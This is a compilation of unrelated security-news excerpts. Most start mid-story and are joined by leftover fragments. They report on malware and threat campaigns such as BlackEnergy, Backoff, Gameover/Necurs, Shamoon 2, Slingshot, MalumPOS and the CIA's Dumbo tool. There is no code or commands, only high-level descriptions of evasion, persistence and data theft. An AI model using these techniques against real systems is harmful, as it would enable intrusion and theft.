BlackEnergy was first identified several years ago. Initially, BlackEnergy's custom plugins were used for launching distributed denial-of-service attacks (DDoS). As time went on however, Kaspersky Lab researchers noted, BlackEnergy2 was seen downloading custom spam and banking information-stealer plugins. Eventually, the malware was adopted by the Sandworm team, which has been linked to cyber-espionage.   \"The BlackEnergy malware is crimeware turned APT tool and is used in significant geopolitical operations lightly documented over the past year,\" Kaspersky Lab researchers blogged Kurt Baumgartner and Maria Garnaeva. \"An even more interesting part of the BlackEnergy story is the relatively unknown custom plugin capabilities to attack ARM and MIPS platforms, scripts for Cisco network devices, destructive plugins, a certificate stealer and more.\"   In their report, the researchers outlined the timeline of the appearance of the various plugins.   \"Before evidence of BlackEnergy2 use in targeted attacks was uncovered, we tracked strange activity on one of the BlackEnergy CnC (command-and-control) servers in 2013,\" the researchers explained. \"This strangeness was related to values listed in newer BlackEnergy configuration files.\"   \"The config file provides download instructions for the loader,\" they continued. \"It also instructs the loader to pass certain commands to the plugins. In this particular case in 2013, the config file included an unknown plugin set, aside from the usual 'ddos' plugin listing.\"   This new module is believed to have been among the first for this group because all of the module versions were listed as \"version 1\", including the DDoS plugin, they noted. The 'ps' plugin is a password stealer, while the 'vsnet' plugin is used to spread and launch a payload – currently the BlackEnergy2 dropper itself - in the local network via PsExec, as well as gaining primary information on the user's computer and network. Another plugin is the 'weap_hwi' plugin, a DDoS tool compiled to run on ARM systems.   \"Over time we were able to collect several plugins as well as the main module for ARM and MIPS architectures,\" the researchers added. \"All of these ARM/MIPS object files were compiled from the same source and later pushed out in one config: \"weap_msl\", \"weap_mps\", \"nm_hwi\", \"nm_mps\", \"weap_hwi\", and \"nm_msl\". It's interesting that the BE2 developers upgraded the ddos plugin to version 2, along with the nm_hwi, nm_mps, and nm_msl plugins. They simultaneously released version 5 of the weap_msl, weap_mps, and weap_hmi plugins.\"   After the disclosure of an unusual CnC server that pushed Linux and the new Windows plugins, the researchers looked closer at new BlackEnergy2 samples and associated CnCs. During an extended period, the researchers collected Windows plugins from different command-and-control servers, without ever observing Linux plugins being downloaded. The researchers believe the Sandworm protects their servers by keeping their non-Windows hacker tools and plugins in separate servers or server folders.   Some of the known Windows plugins include: 'fs', which searches for given file types; 'rd', remote desktop; and 'dstr', which destroys the hard disk by overwriting it with random data. There is also evidence that the attackers are compromising routers as well.    \"We are pretty sure that our list of BE2 tools is not complete,\" the researchers wrote.   So far, BlackEnergy2 has been linked to attacks against organizations in a number of countries, including the Ukraine, Russia and Poland.   " }

The attack began Thursday when an attacker sent an extortion demand for $300 to Meetup CEO Scott Heiferman in an email. According to the CEO, the attack began simultaneously, overwhelming the site's servers with traffic. \"We got to work mitigating the attack, but we remained unavailable for nearly 24 hours,\" he blogged. \"Service was restored Friday at 9.30am EST, but it took many hours for the changes we implemented to defend against the attack to be distributed across the Internet. Many folks did not see us come back up before we were hit again.\" \"On Saturday at 4 pm EST, we received another severe DDoS attack,\" he continued. \"By midnight EST, the engineering team implemented a new solution, and Meetup’s website and apps were widely accessible again. On Sunday, at 8:09 pm EST, another strong attack began again, taking Meetup down for a third time. We spent the past several days taking every step to ensure the site and apps are available.\" The site was down for part of the day as the company recovered from the attack. Heiferman blogged that the company did not pay the ransom because it does not negotiate with criminals and capitulating could make the site a target in the future. \"The extortion dollar amount suggests this to be the work of amateurs, but the attack is sophisticated,\" he opined. \"We believe this lowball amount is a trick to see if we are the kind of target who would pay.  We believe if we pay, the criminals would simply demand much more. Payment could make us (and all well-meaning organizations like us) a target for further extortion demands as word spreads in the criminal world.\" Heiferman made the right decision not to negotiate, said Frank Ip, vice president of U.S. Operations at NSFOCUS, adding that it could start \"a vicious cycle that we've seen in similar circumstances.\" \"Fortunately, the perpetrator is not very sophisticated in this case, as he is using a lot of resources to launch a massive volume attack that is only causing periodic Web and mobile outages,\" he said.

Tinba, also known as Tinybanker and Zusy, was first spotted by researchers in mid-2012. Similar to other banking Trojans, Tinba uses man-in-the-browser (MitB) tactics and web injects to collect valuable information from victims. In May, researchers at IBM Security noticed a campaign involving a new variant of the malware. Experts have spotted infections in Poland, Italy, Germany and the Netherlands. Once it infects a computer, the malware waits for the victim to visit one of the targeted banking websites. When such a website is accessed, web injects are triggered and victims are presented with a bogus message designed to trick them into handing over personal and financial information that the cybercriminals can use to conduct fraudulent transactions. One of the messages spotted by IBM researchers informed users that their account had been locked due to some money being accidentally transferred to it. Victims were instructed to refund the money in order to have the account unlocked. According to researchers, the new Tinba version has some interesting fallback mechanisms designed to protect the botnet against hijacking and takedowns. The list of features includes public key signing to ensure that only authorized botmasters can send commands and updates to the Trojan, update server authentication when receiving new configuration data, and a machine-dependent encryption layer for each bot to prevent spoofing by researchers. Experts also noted that bots are designed to communicate with hardcoded resource URLs, but if necessary they can fall back to URLs from a domain generation algorithm (DGA). One of the first countries targeted by Tinba was Turkey, where more than 60,000 unique infections were identified during a 2012 campaign. Over the past years, the malware, whose source code has been leaked, has considerably expanded its target list. In September 2014, researchers at Avast reported that the Trojan had gone global, targeting financial organizations such as US Bank, Bank of America, HSBC, TD Bank, Chase, Fifth Third Bank, Wells Fargo, Banco de Sabadell, Regions, ING, RBC Royal Bank, CitiBank, Westpac, and others.

Backoff has been at the center of much of the data breach news this year. In August, the U.S. Secret Service estimated more than 1,000 businesses in the country had been infected.   According to Fortinet, unlike previous versions, the latest edition no longer uses a version number in the malware body. Instead, it uses the version name ROM. While it works very similarly to previous versions, changes have been made to make analysis and detection more difficult.   \"During the installation phase,\" blogged Fortinet's Hong Kei Chan, \"Backoff drops a copy of itself on the infected machine and creates a number of autorun registry entries to ensure persistence. This latest version is no different, but instead of disguising itself as a Java component as with previous versions, it pretends to be a media player with the file name mplayerc.exe.\"   \"In addition, unlike previous versions where the CopyFileA API is called to drop a copy of itself, ROM calls the WinExec API,\" the researcher continued. \"The command line used is shown in the following figure. To hinder the analysis process, the malware author utilizes a very common technique by replacing API names with the hashed values, and a custom hashing function is called to look up the API name with the equivalent hash value.\"   The malware's functionality for stealing credit card data is still very much the same and has the ability to parse for both Track 1 and Track 2 data. In this version however, the malware has two additional features: hashing the names of the blacklist processes and storing the stolen credit card information on the local system, the researcher noted.   Changes have also been made to components of the command-and-control (C&C) communication to avoid detection. The malware communicates with the C&C server via port 443, encrypting the traffic and making detection more difficult. The field names of the query string have also been changed, and the contents of some of the fields have additional Base64 encoding.     \"The stolen credit card data is still encoded with RC4 and Base64, but the algorithm for generating the RC4 key has been slightly modified,\" the researcher wrote. \"Previously, the RC4 key was produced from three components: (1) a randomly generated seven-character string, (2) a hardcoded string, and (3) the user logon name and computer name (e.g. “bot @ FTNT”) that were concatenated and then hashed with an MD5 algorithm. In the new version, there is a slight modification in the concatenated strings.\"   The new version also no longer supports keylogging.   \"The functions of ROM are very similar to the version preceding it, but modifications have been made by the malware author for evading detection and hindering the analysis process,\" the researcher noted.

Researchers at Palo Alto Networks have been monitoring the campaign, which dates back to at least mid-2016. Dubbed “Magic Hound,” the operation has been aimed at energy, government and technology sector organizations that are located or have an interest in Saudi Arabia. The threat actor behind Magic Hound has used a wide range of custom tools and an open-source cross-platform remote access tool (RAT) named Pupy. While Palo Alto Networks has not attributed these attacks to any country, researchers at SecureWorks have also analyzed the campaign and they believe it is related to an actor which they track as COBALT GYPSY. SecureWorks is highly confident that COBALT GYPSY is associated with the Iranian government. The Magic Hound attacks started with specially crafted macro-enabled Word and Excel documents set up to fetch additional tools using PowerShell. The malicious files appear to be holiday greeting cards, job offers, and official government documents from the Ministry of Health and the Ministry of Commerce in Saudi Arabia. The threat actor has used different types of custom tools to achieve its goals, including droppers, downloaders, executable loaders, document loaders and IRC bots. One of the payloads they delivered was the Python-based Pupy RAT. It’s worth noting that some of the domains used in this attack and a link to the Pupy RAT were also uncovered by IBM X-Force researchers while trying to determine the initial entry point in the recent Shamoon 2 attacks. The initial breach vector, involving macro-enabled documents and PowerShell, is also similar. Palo Alto Networks has found connections between the Magic Hound attacks and the Iran-linked threat group known as Rocket Kitten, which has targeted organizations in the Middle East and NATO countries. Furthermore, an IRC bot used in the Magic Hound campaign is very similar to a piece of malware used by Newscaster, aka Charming Kitten and NewsBeef, an Iranian actor known to target individuals in the U.S., Israel and other countries using fake social media personas. The Charming Kitten and Rocket Kitten groups were also referenced recently in an analysis of MacDownloader, a piece of malware used by Iranian actors to steal data from Mac computers. " }

Kaspersky Lab revealed last month that the Russian threat actor known as Sofacy, APT28, Fancy Bear, Pawn Storm, Sednit and Strontium had shifted its focus from NATO member countries and Ukraine to Central Asia and further east, including China. On Friday, at Kaspersky’s Security Analyst Summit (SAS), researcher Kurt Baumgartner revealed that the group appears to be particularly interested in military, defense and diplomatic entities in the far east. Baumgartner also revealed that the attacks launched by Sofacy sometimes overlap with the operations of other state-sponsored cyberspies in terms of victims. For instance, researchers discovered Sofacy’s Zerbrocy malware on machines that had also been compromised by Mosquito, a backdoor associated with Turla, a different threat actor linked to Russia. Shared victims include diplomatic and commercial organizations in Europe and Asia. Sofacy’s SPLM malware (aka CHOPSTICK and X-Agent) was found on devices that had also been infected with other Turla malware, which often precedes SPLM. SPLM has also been spotted on the same systems as malware known to have been used by a China-linked actor known as Danti. According to Kaspersky, overlaps were generally found on systems belonging to government, technology, science, and military organizations in or based in Central Asia. Another interesting overlap was between Sofacy and the English-speaking Lamberts group, which is also known as Longhorn. Security firms revealed last year that this cyber espionage group had been using some of the Vault 7 tools leaked by WikiLeaks. These tools are believed to have been developed and used by the U.S. Central Intelligence Agency (CIA). Kaspersky said it had identified Sofacy backdoors and malware associated with the Lamberts, specifically Grey Lambert, on a server belonging to a military and aerospace conglomerate in China. Researchers admit, however, that the presence of both Lamberts and Sofacy malware on the server could simply mean that the former planted a false flag, considering that the original delivery vector for the Sofacy tool remains unknown. It’s also possible that the Russian group exploited a previously unknown vulnerability, or that it somehow harnessed the Grey Lambert malware to download its own tools. The most likely scenario, according to experts, is that the Sofacy malware was delivered using an unknown PowerShell script or a legitimate app in which the attackers discovered a flaw. “Sofacy is sometimes portrayed as wild and reckless, but as seen under our visibility, the group can be pragmatic, measured and agile. Their activity in the East has been largely under-reported, but they are clearly not the only threat actor interested in this region, or even in the same targets,” Baumgartner said. “As the threat landscape grows ever more crowded and complex, we may encounter more examples of target overlap and it could explain why many threat actors check victim systems for the presence of other intruders before fully launching their attacks.” Kaspersky recently spotted the SPLM malware being used in an attack aimed at major air defense organization in China, while the Zebrocy tool has been used in high volume campaigns targeting entities in Armenia, Turkey, Tajikistan, Kazakhstan, Afghanistan, Mongolia, Japan and China.

KONNI is a remote access trojan (RAT) that managed to stay under the radar for more than 3 years. The malware has evolved over the past years and it’s currently capable of logging keystrokes, stealing files, capturing screenshots, and collecting information about the infected machine. KONNI has mainly been used to target organizations linked to North Korea. One of the campaigns spotted by researchers at Cisco Talos this year involves a dropper named “Pyongyang Directory Group email April 2017 RC_Office_Coordination_Associate.scr,” which opens a Word document when executed. Researchers at Cylance noticed that this decoy document, titled “Pyongyang e-mail lists - April 2017,” is very similar to a document delivered in a recent campaign linked by Bitdefender to DarkHotel, a threat group that has been around for nearly a decade. DarkHotel came to light in November 2014, when Kaspersky published a report detailing a sophisticated cyber espionage campaign targeting business travelers in the Asia-Pacific region. The group, whose members appear to be Korean speakers, possibly from South Korea, has targeted individuals in North Korea, Russia, South Korea, Japan, Bangladesh, Thailand, Taiwan, China, the United States, India, Mozambique, Indonesia and Germany. The new DarkHotel campaign analyzed by Bitdefender, dubbed “Inexsmar” by the security firm, was aimed at government employees with an interest in North Korea. One of the decoy documents used in the attack is very similar to the one seen in the KONNI attacks – it’s titled “Pyongyang e-mail lists - September 2016” and its content has the same format.  Furthermore, an analysis of the files’ description revealed that they are both titled “Pyongyang directory” and they were both authored by an individual named “Divya Jacob.” Cylance has conducted a detailed analysis of KONNI and the company’s experts believe that, as a result of the recent attention, the malware’s authors will release new variants that will include better obfuscation and additional capabilities.

According to research from Sophos, a new variant of the malware has been armed with a kernel-level rootkit that stops users from killing the Gameover process and makes it difficult to remove the Trojan. Known as Necurs, the rootkit has been added to protect the malware files on disk and in memory. \"Necurs is a nasty rootkit,\" said James Wyke, senior threat researcher at Sophos. \"There will be many security solutions that were able to remove Gameover without the rootkit but no longer can. This makes Gameover more difficult to remove and detect and therefore likely to persist on an infected machine for longer. As a result, more data will be stolen from the victim. There is more danger in a threat that stays on a victim’s machine for a month, say, all the while silently stealing credentials every time the victim logs in to a website, than a threat that gets detected and removed in a day.\" Gameover first appeared after the source code for the Zeus malware was leaked on the Internet. Recently, researchers at Dell SecureWorks dubbed the malware the most prevalent banking Trojan of 2013, noting that it accounted for 38 percent of the company's detections of financial malware. This particular variant appears to be spreading via a spam campaign using fake invoices. The attachments don't actually contain the malware; instead the attachments contain a downloader known as Upatre. If the recipient launches the file, it downloads an unstructured set of data that has a compressed copy of Gameover, which is then unscrambled and launched by the downloader. Once launched, Gameover gets installed in the user's Application Data directory and tags itself with a short block of system-specific binary data. According to Sophos, the tagging serves two purposes - to prevent the copy from running anywhere else if it taken away for analysis, and to make it unique so that checksum-based file matching can't be used to detect it. Normally, this would be when the Trojan injects itself into other processes and exits; instead, this is where the new version installs the rootkit. If the user's system is 32-bit and they do not have administrator rights, the malware attempts to exploit CVE-2010-4398 to escalate privileges so that it can load the driver. If that vulnerability is patched on the system, the loading of the rootkit will trigger a User Account Control alert. Meanwhile, the 64-bit driver is digitally signed with a bogus certificate, and the malware will try to reconfigure the system so that it accepts unverified drivers. Interestingly, this is not the first time a Zeus variant has been seen using a rootkit. In fact, early versions used a user-mode rootkit to hide the Trojan's directory and registry entries, according to Sophos. However, this was dropped in latter versions and was viewed as largely ineffective. Noting that the rootkit comes from another malware family, Wyke speculated that there could be a level of collusion between different attacker groups. \"One major benefit of using a rootkit from another family is that the code comes pre-built and pre-tested,\" Wyke said. \"They don’t have to spend time and effort developing the driver themselves and they know it works already as it’s been used in the field for quite some time. Necurs has been used as a protection mechanism for FakeAV in the past but this is the first time we’ve seen other malware families using it.\" " }

Stuxnet, reportedly developed by the United States and Israel, is a worm designed to target industrial systems. The malware became known as the world’s first cyber weapons after it caused serious damage at Iranian nuclear facilities. Now, five years after it was first discovered, Stuxnet infections still exist, according to Czech Republic-based security firm Kleissner & Associates, which operates the botnet monitoring system Virus Tracker. In a paper published last week, titled “Internet Attacks Against Nuclear Power Plants,” the company provided some Stuxnet-related statistics from Virus Tracker. Kleissner & Associates has the ability to monitor Stuxnet infections because it has acquired two of the command and control (C&C) domains used by the worm and pointed them to Virus Tracker sinkhole servers. According to Kleissner, there were at least 153 unique machines infected with Stuxnet in 2013 and 2014. Nearly half of these infections were traced back to Iran, but some infected devices had also been spotted in India, Indonesia, Saudi Arabia, Kazakhstan and China. Experts determined that six of the infected computers had SCADA development software installed. While these statistics are from 2013 and 2014, even today there are a few organizations that have failed to remove Stuxnet from their systems. Peter Kleissner, founder and CEO of Kleissner & Associates, told SecurityWeek that Virus Tracker shows more than 200 Stuxnet infection records in 2015. India accounts for roughly 45 percent of infection records, followed by Iran with 33 percent, and Indonesia with 10 percent. Kleissner has pointed out that the number of infection records doesn’t indicate the number of unique infected devices because the same infection can generate multiple records.  Kleissner noted that while the malware is still actively running in the background on these machines, it cannot be controlled by the original attackers because the C&C domains are owned by the security company. However, this shows that some organizations are not doing a good job when it comes to cleaning up malware. The statistics presented by the security firm are meant to show that there is a risk of Stuxnet-like operations and that nuclear plants might not be difficult to breach. “It is inevitable that existing malware infections lower the overall security of the particular machines and the entire networks and therefore make it easier (or possible at all) for anyone else to intrude the system,” reads Kleissner & Associates’ researcher paper. “Just as Kleissner & Associates' C&C domain control enables us to control any remaining Stuxnet infected machines, any capable intelligence service (or individual with the knowledge and skills) could seize control and potentially cause considerable damage leveraging the remaining infections.” According to the security firm, many nuclear facilities host administrative systems infected with common malware. Attackers can leverage access to these administrative systems to mount attacks on industrial control systems. Virus Tracker shows malware infections at IP ranges that appear to belong to nuclear facilities, but experts cannot determine if the infected device is a worker’s laptop, a guest Wi-Fi, or a machine controlling the entire nuclear power plant. On the other hand, Kleissner has pointed out that any malware connecting from the facility to external C&C servers can be problematic. Kleissner told SecurityWeek that they have identified Conficker B and Ramdo infections on IP addresses that appear to belong to an energy provider in the United States. Other examples include Conficker and Sality infections on IP addresses apparently associated with atomic energy research organizations in China and Korea. " }

The framework, called ScanBox, was first analyzed by researchers at AlienVault, who revealed in August that the tool had been planted on the website of a major industrial company. Researchers at PricewaterhouseCoopers (PwC) have been monitoring ScanBox attacks and determined that it is likely used by more than one group. ScanBox is designed for reconnaissance missions. The framework uses plugins to collect various pieces of information on the visitors of targeted websites, including details on their computers and the software they are running. The tool also includes keylogging functionality that records all the keystrokes performed by users while visiting a site. PwC has identified four watering hole attacks leveraging ScanBox. In August, the company spotted a campaign aimed at a Japanese organization in the industrial sector and, in September, the tool was used to target the Uyghur population in China. In October, attacks were observed against a think tank in the United States and a Korean organization in the hospitality sector. While it's possible that all these operations are the work of a single group that targets a wide range of organizations, researchers have found evidence to suggest that different threat actors are behind each of these attacks. During their analysis of the attacks, PwC researchers focused on the implementation of the framework and the infrastructure used by the attackers in each case. Experts have determined that the framework implementations used in each of the four attacks share the same codebase, but there are some \"subtle\" differences. The differences are in software enumeration implementation, and the selective loading of plugins depending on the user's browser, which not only prevents errors that could expose the operation, but also makes the job of researchers slightly more difficult. While the implementation differences could be a result of upgrades to the framework or the adaptation of code for different targets, researchers have found that there is only little overlap between the campaigns in terms of infrastructure. PwC says they haven't been able to identify any direct overlaps between the attacks, such as shared domains or IP addrsses. \"In our view, the hypothesis with the highest probability is that groups of attackers share resources leading to overlaps – this appears to be an ever more common feature – with malware families, builders, and even sometimes hosting infrastructure being shared between disparate actors with a common goal,\" PwC's Chris Doman and Tom Lancaster wrote in a blog post. \"Sharing frameworks like ScanBox or other exploit kits allows less sophisticated actors (who were themselves unable to develop a tool like ScanBox) to conduct better attacks.\"   " }

Shamoon 2 was recently spotted in attacks aimed at Saudi Arabia and other states in the Persian Gulf. The malware, also known as Disttrack, has several variants, including one capable of targeting virtual desktop infrastructure (VDI) products. An analysis conducted recently by Symantec showed that the attackers behind Shamoon, which many believe are based in Iran, may have been aided by a threat actor dubbed Greenbug. The security firm linked the Greenbug and Shamoon groups after discovering malware from both actors on the same system. X-Force IRIS researchers have analyzed the recent waves of Shamoon attacks and determined that the initial breach likely took place weeks before the malware was deployed and activated. It’s worth noting that, in many cases, Shamoon had been programmed to step into action at a specified time and date, typically when the targeted organization’s employees were less likely to notice its actions. Experts believe the attackers used weaponized Office documents as an entry point. The documents contained a malicious macro which, when executed, initiated command and control (C&C) communications and deployed a remote shell via PowerShell. The malicious files, which often included resumes and other human resources documents, were sent to targeted users via spear phishing emails. Some of the documents found by IBM referenced an Egypt-based software professional services organization named IT Worx, and Saudi Arabia’s Ministry of Commerce and Investment (MCI). Once the document is opened and the macro is executed, PowerShell is invoked to provide a communications channel to the compromised device, allowing attackers to remotely execute commands on it. The threat actor can use this access to deploy other tools and malware, and gain further access into the victim’s network. Once critical servers have been identified, the attackers can deploy Shamoon, which erases hard drives and causes systems to become inoperable. The macro found in the documents executed two PowerShell scripts, including one served from a domain that had hosted a cross-platform remote access tool named Pupy. The RAT and the domain in question were also spotted during the analysis of an Iran-linked campaign dubbed \"Magic Hound.\" IBM researchers believe the recent analysis and warnings issued by Saudi Arabia will likely cause the Shamoon attackers to once again disappear, like they did after the 2012 Saudi Aramco operation, and change their tactics for the next wave of attacks.

Maxim Senakh was indicted in the U.S. in January 2015 and was later arrested by authorities in Finland. His extradition to the United States was approved in January 2016 and, earlier this year, he pleaded guilty to conspiracy to violate the Computer Fraud and Abuse Act (CFAA) and conspiracy to commit wire fraud. After serving his 46-month prison sentence in the United States, Senakh will be deported to Russia. According to U.S. authorities, Senakh and his accomplices used the Ebury malware, an OpenSSH backdoor and credential stealer, to create a botnet that helped them make millions of dollars through click-fraud and email spam campaigns. The Russian national, who admitted profiting from the traffic generated by the botnet, was responsible for registering domains used for the command and control (C&C) infrastructure. Ebury was first spotted in 2011. Security firm ESET, Germany’s CERT‑Bund, the Swedish National Infrastructure for Computing, and the European Organization for Nuclear Research (CERN) published a detailed analysis of the malware in February 2014. The U.S. Department of Justice said the botnet operated by Senakh and his co-conspirators ensnared tens of thousands of servers across the world, including thousands in the U.S. “The defendant and his co-conspirators sought to turn a network of thousands of infected computers in the United States and around the world into their personal cash machines,” said Acting Assistant Attorney General Kenneth A. Blanco of the DOJ’s Criminal Division. “But cybercriminals like Mr. Senakh should take heed: they are not immune from U.S. prosecution just because they operate from afar or behind a veil of technology. We have the ability and the determination to identify them, find them, and bring them to justice.” Several Russian hackers have been sentenced to prison this year in the United States, including Mark Vartanyan, Alexander Tverdokhlebov and Roman Valeryevich Seleznev.

While the campaign seems to focus on individuals, the security firm has also observed attacks aimed at government organizations and, strangely, some internet cafés. The main piece of malware used by this group — dubbed Slingshot based on internal strings found by researchers — is interesting due to the fact that it infects computers through compromised routers, specifically ones made by Latvia-based Mikrotik. It’s unclear how the targeted routers get compromised, but Kaspersky pointed out that the WikiLeaks Vault7 files, which are believed to be tools developed and used by the CIA, do include a Mikrotik exploit. The vendor claims to have patched the vulnerability leveraged by the Vault7 exploit and it’s unclear if that is the initial vector used by the attackers. Once they gain access to a router, hackers can abuse a legitimate piece of software called WinBox, a management tool provided by Mikrotik that downloads some DLL files from the router and loads them directly into the computer’s memory. By abusing this functionality, the Slingshot hackers can deliver the malware to the targeted router’s administrator. The malware is basically a first-stage loader that replaces legitimate DLL files in Windows with malicious versions that have the exact same size. The malicious DLLs are loaded by the services.exe process, which has SYSTEM privileges. The main modules downloaded by Slingshot are called Cahnadr and GollumApp. Cahnadr, also known as Ndriver, is a kernel-mode payload and it provides all the capabilities required by user-mode modules, including anti-debugging, rootkit functionality, injecting modules into the services.exe process, network communications, and sniffing capabilities for various protocols. GollumApp is the main user-mode module and it’s designed to manage other user-mode modules while constantly interacting with Cahnadr. It includes a wide range of spying-focused functionality that allows attackers to capture screenshots, log keystrokes, collect system and network data, harvest passwords, manipulate clipboard data, run new processes with SYSTEM privileges, and inject other malicious modules into a specified process. Since it can run in kernel mode, a feature typically present in sophisticated threats, the malware allows attackers to take full control of the infected machine. Slingshot attempts to evade detection by using various methods, including calling system services directly in an effort to bypass security product hooks, encrypting strings in its modules, and selectively injecting processes depending on what security product is present. Slingshot also employs some clever techniques when it comes to command and control (C&C) communications – the malware hides its traffic in legitimate communication protocols, keeping an eye out for packets that contain a special mark. As for who is behind Slingshot, Kaspersky says it bears the hallmarks of a state-sponsored cyber espionage campaign. Its level of sophistication rivals the one of actors such as ProjectSauron and Regin. Researchers said most of the debug messages are written in perfect English and several strings in the code reference Lord of the Rings characters. “Slingshot is a sophisticated threat, employing a wide range of tools and techniques, including kernel mode modules that have to date only been seen in the most advanced predators,” said Alexey Shulmin, lead malware analyst at Kaspersky Lab. “The functionality is very precious and profitable for the attackers, which could explain why it has been around for at least six years.” " }

That vulnerability, CVE-2014-0502, is a double free vulnerability that could result in arbitrary code execution. In addition to plugging that security hole, Adobe also issued patches for a stack overflow vulnerability and a memory leak issue not known to be under attack. According to Adobe, the bugs affect Adobe Flash Player 12.0.0.44 and earlier versions for Windows and Macintosh and Adobe Flash Player 11.2.202.336 and earlier versions for Linux. Like the double free issue, the stack overflow vulnerability can be exploited to remotely execute code. In a blog post, researchers at FireEye explained that visitors to at least three non-profits - including two that focus on national security and public policy issues - were redirected to an exploit server hosting the zero-day exploit. The attack was identified Feb. 13. Visitors to the Peter G. Peterson Institute for International Economics (www.piie[.]com) were redirected to an exploit server hosting this Flash zero-day through a hidden iframe. Subsequently, the American Research Center in Egypt (www.arce[.]org) and the Smith Richardson Foundation (www.srf[.]org) also redirected visitors the exploit server. \"This threat actor clearly seeks out and compromises websites of organizations related to international security policy, defense topics, and other non-profit socio-cultural issues,\" according to FireEye. \"The actor either maintains persistence on these sites for extended periods of time or is able to re-compromise them periodically.\" \"This actor also has early access to a number of zero-day exploits, including Flash and Java, and deploys a variety of malware families on compromised systems,\" the FireEye researchers continued in a blog post. \"Based on these and other observations, we conclude that this actor has the tradecraft abilities and resources to remain a credible threat in at least the mid-term.\" According to Qualys CTO, Wolfgang Kandek, in particular the attack needs to bypass ASLR to be successful and therefore only focuses on certain configurations: - Windows XP (which does not have ASLR) - Windows 7 with Java 1.6 installed, which allows for an ALSR bypass, but Java 1.6 is EOL already and in general vulnerable to other exploits  - Windows 7 with a not fully updated version of Office 2007 or Office 2010, also vulnerable to other exploits  \"Our recommendation is to update as quickly as possible,\" Kandek said. \"Organizations that run any of the above organizations needs to do this as quickly as possible, others can roll out this patch on a normal schedule, but need to be aware that attackers may switch their tactics at any time to abuse other software packages that also leak memory locations.\" The fix from Adobe comes a day after Microsoft released a Fix It tool to address attacks targeting a vulnerability in Internet Explorer. The issue impacts Internet Explorer versions 9 and 10, and Microsoft is urging users to upgrade to IE 11 to avoid attacks.  " }

Micros, acquired last year by Oracle for $5.3 billion, develops PoS and enterprise information software for the retail and hospitality industries. According to Oracle, more than 330,000 Micros systems are currently deployed by firms in over 180 countries. The MalumPOS malware, which is distributed through various methods, disguises itself as “NVIDIA Display Driver” or “NVIDIA Display Driv3r” on the infected system. Once it infects a device, the threat monitors running processes and scrapes their memory contents for valuable payment card information. The malware can target up to 100 processes, Trend Micro noted in a technical brief. The scraped credit card data is encrypted and stored in a file named “nvsvc.dll” in order to make it appear as if it’s a component of the legitimate NVIDIA driver. MalumPOS has been developed using the Delphi programming language and it uses regular expressions to search for credit card numbers and other valuable data. Different regular expressions are used to identify Track 1 and Track 2 data. The malware targets Visa, American Express, Discover, MasterCard and Diners Club cards, researchers said. According to Trend Micro, the stolen data can be used to clone payment cards or to conduct fraudulent transactions online. Many of the potential victims are located in the United States. It’s not uncommon for PoS malware to use regular expressions to identify payment card information. However, experts noted that the specific expressions used by MalumPOS were previously spotted in the Rdaserv malware family. Trend Micro says it has identified several similarities between Rdaserv and MalumPOS, which suggests that the threats are somehow connected. In addition to disguising components as NVIDIA graphics drivers, the malware developers also use old time stamps (e.g. 1992-06-19 17:22:17), and dynamically loaded APIs to evade detection. While MalumPOS appears to mainly target devices using the Micros platform, researchers say it’s also capable of stealing information from systems running Oracle Forms, Shift4 and ones accessed via Internet Explorer. Payment gateway Shift4 has clarified that its product uses fully tokenized and point-to-point encryption (P2PE) hardware-based solutions that prevent any memory scraping malware from gathering cardholder data. \"The Trend Micro brief, based on a 2014 report, is likely referencing 2013 data that is no longer valid. Since then, PAR Springer-Miller has recertified with Shift4 with a fully tokenized and P2PE hardware based solution,\" Steve Sommers, SVP of Applications Development with Shift4, told SecurityWeek. \"This means that any memory scraping malware is rendered useless in gathering cardholder data. Swipe information and hand-keyed payment information is encrypted at the point of entry, which then flows through Shift4's Universal Transaction Gateway as an encrypted block. Keys do not exist at the merchant location to decrypt this information.\" \"Combined with 4Res®, which is used to tokenize payment information contained in reservation requests from third parties, all payment information at the merchant property is tokenized. Thus, tokens or encrypted P2PE card blocks are all that can be scraped,\" Sommers added. Trend Micro has pointed out that MalumPoS is configurable. “This means that in the future, the threat actor can change or add other processes or targets. He can, for example, configure MalumPoS to include Radiant or NCR Counterpoint PoS systems to its target list,” Trend Micro threat analyst Jay Yaneza wrote in a blog post. *Updated with clarifications from Shift4 " }

The tool, dubbed “Dumbo,” is executed directly from a USB thumb drive by an operative who has physical access to the targeted device. Once executed, the program can mute microphones, disable network adapters, and suspend processes associated with video recording devices. Dumbo also informs its user of where those video recording processes store footage so that the files can be corrupted or deleted. The user guides made available by WikiLeaks — the latest version is dated June 2015 — show that the tool was developed in response to the need for a capability to disrupt webcams and corrupt recordings in an effort to prevent a PAG (Physical Access Group) deployment from getting compromised. PAG is a special branch within the CIA’s Center for Cyber Intelligence (CCI) and its role is to gain physical access to computers and exploit this access, WikiLeaks said. The tool, designed for Windows XP and newer versions of the Microsoft operating system, needs SYSTEM privileges to function correctly. “[The tool] identifies installed devices like webcams and microphones, either locally or connected by wireless (Bluetooth, WiFi) or wired networks. All processes related to the detected devices (usually recording, monitoring or detection of video/audio/network streams) are also identified and can be stopped by the operator,” WikiLeaks said. “By deleting or manipulating recordings the operator is aided in creating fake or destroying actual evidence of the intrusion operation.”  Dumbo developers pointed out that home security products (e.g. Kaspersky antivirus) may block some of the tool’s functions, and advised users to disable any protections before installation. WikiLeaks has exposed numerous tools allegedly used by the CIA as part of a leak dubbed Vault 7. The tools detailed so far are designed for hacking Mac OS X devices (Imperial), intercepting SMS messages on Android devices (HighRise), redirecting traffic on Linux systems (OutlawCountry), stealing SSH credentials (BothanSpy), spreading malware on an organization’s network (Pandemic), locating people via their device’s Wi-Fi (Elsa), hacking routers and access points (Cherry Blossom), and accessing air-gapped networks (Brutal Kangaroo).

